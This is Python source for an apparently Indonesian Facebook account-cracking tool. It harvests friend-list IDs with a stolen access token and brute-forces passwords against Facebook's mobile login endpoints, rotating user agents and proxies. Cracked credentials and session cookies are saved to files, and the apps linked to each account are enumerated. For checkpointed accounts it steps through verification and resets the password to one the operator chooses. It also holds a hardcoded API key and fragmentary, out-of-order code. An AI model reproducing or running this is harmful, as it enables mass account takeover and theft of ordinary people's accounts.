	sys.stdout.write(f"\r💐 {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen('play-audio .cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
				session = requests.Session()
				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
				nok=1
				for muncul in apkaktif:
					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
					nok+=1

				hit=0
				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
				hit=0
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
				os.popen('play-audio .ok.mp3')
				ok+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1

#ANGGAP SAJA MENU KREK V3
def publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	pil = input('input id target :  ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		print(' Total Id \033[32m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('TERJADI KESALAHAN PADA INTERNET SILAKAN PASANG MODE PESAWAT')
		exit()
	except (KeyError,IOError):
		print('Pertemanan Tidak Publick')
		publik()
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		print('╰─ File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('╰─ Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('╰─ %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n╰─ Chouse : ')
		print('')
		try:geh = lol[geeh]
		except KeyError:
			print(f'╰─{k} Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			print('╰─ File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def cek_cp():
	dirs = os.listdir('CP')
	print(f" {H}MASUKAN NAMA FILE YANG AKAN DI CEK OPSI CP")
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m [ CONTOH ==> %s: %sCP-%s.txt%s "%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak di temukan'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak ada"%(M,til,romi))
	jalan("%s%s%s\033[0m sedikit saran dari saya jangan menganti pasword opsi cp karna bisa jadi akun tapyes=sesi new!!! "%(U,til,O))
	pw=input("\n%s%s%s \033[0mingin mengubah password langsung? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan pasword contoh : {M}ridwangans01{P} %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s____________________ %s#"%(P,M,P));jeda(2)
	print ("%s%s%s\033[0m tTERDAPET  %s: %s%s akun untuk di cek "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s____________________ %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0msedang login ke akun  %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter untuk kembali ke menu%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s \033[0mditemukan %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab silakan cek MBASIC,LITE\n TAB %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36")
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':	
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('rm -rf .prox.txt')
	except:pass
	try:os.system('rm -rf .proxy.txt')
	except:pass	
	ridwan_xd1928(f'\n\t{x}——> {h}Selamat Datang Di Tools Saya\n\t{x}')
	time.sleep(3)
	login()